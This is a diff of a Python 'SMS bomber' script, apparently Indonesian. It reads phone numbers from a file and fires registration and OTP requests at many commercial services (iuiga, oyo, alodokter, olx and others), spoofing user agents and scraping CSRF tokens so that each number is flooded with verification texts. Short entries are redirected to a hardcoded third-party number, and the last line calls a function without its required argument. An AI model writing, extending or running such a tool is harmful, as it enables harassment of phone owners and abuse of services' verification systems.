@@ -2,13 +2,14 @@ import requests
 import time
 import json
 import sys
+from cba import c
 from fake_useragent import UserAgent
 from bs4 import BeautifulSoup as bs
 ua = UserAgent()
 
 
 def panggil():
-    strfile = input("Nama File: ")
+    strfile = input(c.lg+"Nama File: "+c.end)
     strfile = strfile + ".txt"
     return strfile
 
@@ -120,15 +121,16 @@ class spam:
                    '_cwpeople_keyle_key': a["_cwpeople_key"]}, data=jsn).text
 
     def iuga(nom):
-        pis = nom.replace("+62", "")
+        no = str(nom)
+        pis = no.replace("+62", "")
         r = requests.Session()
         for x in range(1):
             a = r.get('https://www.iuiga.com/register.html',
                       headers={'user-agent': ua.random}).text
             b = bs(a, 'html.parser')
             c = b.find("meta", attrs={"name": "csrf-token"})
-            d = r.post('https://www.iuiga.com/login/send-register-code', headers={'user-agent': ua.random}, data={
-                       "_csrf": c["content"], "phone": pis, "phone_code": "+62", "is_login": "0"}).text
+            r.post('https://www.iuiga.com/login/send-register-code', headers={'user-agent': ua.random}, data={
+                "_csrf": c["content"], "phone": pis, "phone_code": "+62", "is_login": "0"}).text
 
     def fav(nom):
         hd = {
@@ -547,24 +549,40 @@ class spam:
         send = requests.post(url+nom, headers=ua, data=at)
 
 
-file = panggil()
-ojk = open(file, "r")
-ojk.readline()
-for no in ojk:
-    nom = no.replace('\n', '')
-    if len(nom) <= 10:
-        no = nom.replace(nom, '00000000000')
-        spam.oyo(no)
-    elif len(nom) >= 10:
-        spam.icq(nom)
-        spam.adakami(nom)
-        spam.iuga(nom)
-        spam.fav(nom)
-        spam.kelaspintar(nom)
-        spam.alodokter(nom)
-        spam.redbus(nom)
-        spam.olx(nom)
-        spam.rupa(nom)
-        spam.tel(nom)
-        print(nom + " ~> Sudah selesai diproses\n\n")
-ojk.close()
+def tmpl(file):
+    num = 0
+    ojk = open(file, "r")
+    for num, line in enumerate(ojk, 1):
+        num = [num]
+    print(f"\n{c.lc}Jumlah yang ada di file {file} {c.lr}{str(num[0])}{c.lc} baris{c.lp} \n")
+    return num
+
+
+def sms():
+    file = panggil()
+    ojk = open(file, "r")
+    tmpl(file)
+    on = 0
+    for no in ojk:
+        on += 1
+        nom = no.replace('\n', '')
+        if len(nom) <= 10:
+            no = nom.replace(nom, '89699991212')
+            spam.oyo(no)
+            spam.iuga(no)
+        elif len(nom) >= 10:
+            spam.icq(nom)
+            spam.adakami(nom)
+            spam.fav(nom)
+            spam.kelaspintar(nom)
+            spam.alodokter(nom)
+            spam.redbus(nom)
+            spam.olx(nom)
+            spam.rupa(nom)
+            spam.tel(nom)
+            print(f"{c.lb}0{nom} ~> Ini nomor yang ke {c.lr}{on}{c.lp}\n")
+    ojk.close()
+
+
+sms()
+tmpl()
